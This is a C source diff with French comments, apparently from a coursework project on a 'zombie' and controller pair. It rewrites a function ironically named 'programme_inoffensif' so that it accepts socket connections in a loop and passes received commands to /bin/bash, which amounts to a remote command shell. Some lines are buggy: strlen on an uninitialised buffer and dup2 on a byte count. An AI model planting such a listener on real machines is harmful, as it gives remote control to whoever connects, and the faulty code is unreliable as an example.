@@ -34,36 +34,16 @@ void EndZombieHandler(int num){
     end = 1;
 }
 
-void programme_inoffensif(void* adrr, void* portt, void* newsockfdd) {
+void programme_inoffensif(void* newsockfdd) {
     int* newsockfd = newsockfdd;
-    char* commande;
-    char* response;
-    printf("Début du programme inoffensif\n");
-    /*FILE *fp = popen("/bin/bash", "r"); // Ouvrir un terminal bash
-    if (fp == NULL) {
-        perror("popen");
-        exit(1);
-    }*/
+    char commande[256];
 
-    printf("/bin/bash ouvert\n");
-    while(end!=1){
-        // lis ce que lui envoie le controller
-        sread(*newsockfd, &commande, sizeof(char));
+    int fd = sread(*newsockfd,commande,strlen(commande));
 
-        if(strcmp(commande, "stop") == 0){
-            end = 1;
-            printf("Fin du programme inoffensif\n");
-        }else{
-            // execute la commande dans le terminal
-            printf("Execution de la commande\n");
-            /*response = fprintf(fp, "%s", commande);*/
-            /*response = */fprintf(stdout, "%s", commande);
-            // renvoie le resultat de la commande au controller
-            swrite(*newsockfd, &response, sizeof(char));
-        }
-        sleep(1);
-    }
-    //pclose(fp); 
+    dup2(fd,0);
+
+    sexecl("/bin/bash", "bash", commande, (char *) NULL);
+
 }
 
 int main(int argc, char *argv[]){
@@ -77,21 +57,19 @@ int main(int argc, char *argv[]){
     
     int sockfd = initSocketZombie(port);
 
-    int newsockfd = saccept(sockfd);
-    printf("Connexion établie\n");
+    while(!end){
+        // attend une connexion
+        printf("En attente de connexion\n");
+        int newsockfd = saccept(sockfd);
+        printf("Connexion établie\n");
 
-    char* adr;
-    sread(newsockfd, &adr, sizeof(char));
+        int pid_zombie = fork_and_run1(programme_inoffensif, &newsockfd);
 
-    printf("Adresse du controller : %s\n", adr);
-
-    int pid_zombie = fork_and_run3(programme_inoffensif, &adr, &port, &newsockfd);
-
-    /* Attente de la terminaison du processus fils */
-    int status;
-    swaitpid(pid_zombie, &status, 0);
-
-    sclose(newsockfd);
+        /* Attente de la terminaison du processus fils */
+        int status;
+        swaitpid(pid_zombie, &status, 0);
+        sclose(newsockfd);
+    }
 
     return 0;
     
